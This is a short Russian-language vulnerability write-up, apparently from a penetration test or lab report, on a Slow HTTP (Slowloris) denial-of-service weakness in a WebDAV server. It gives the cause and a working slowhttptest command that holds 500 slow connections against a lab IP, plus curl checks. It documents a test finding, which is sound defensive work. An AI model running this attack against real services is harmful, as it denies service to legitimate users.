Уязвимость, эксплуатирующая архитектурные особенности обработки входящих сессий веб-сервером
Векторы семейства Slow HTTP (Slowloris, Slow Body/Read) не требуют высокой пропускной способности канала связи
Атака направлена на исчерпание пула рабочих потоков веб-сервера
Нарушитель открывает множество параллельных TCP-соединений с целевым сервисом WebDAV и начинает передавать HTTP-заголовки или тело запроса с минимально допустимой скоростью
Сетевой демон вынужден удерживать дескрипторы соединений открытыми, ожидая завершения транзакции
При достижении лимита максимального количества одновременных подключений веб-сервер перестает принимать запросы, переводя службу в состояние полного отказа в обслуживании для легитимных пользователей

Использование стандартных параметров веб-сервера без активированных модулей контроля скорости передачи данных и завышенные таймауты ожидания сессий
Контрольный запрос подтверждает штатный отклики WebDAV-интерфейса:
curl -I -s http://192.168.1.21/ | grep HTTP
Результат: HTTP/1.1 200 OK
С атакующей машины инициируется специализированный тест с помощью утилиты slowhttptest, моделирующий медленное заполнение HTTP-заголовков в 500 параллельных потоках с ограничением времени сессии в 60 секунд:
slowhttptest -H -c 500 -i 10 -r 50 -t GET -u http://192.168.1.21/ -l 60
В момент удержания сокетов утилитой slowhttptest выполняется попытка легитимного подключения с независимого узла с ограничением времени ожидания ответа:
curl -I --connect-timeout 5 http://192.168.1.21/
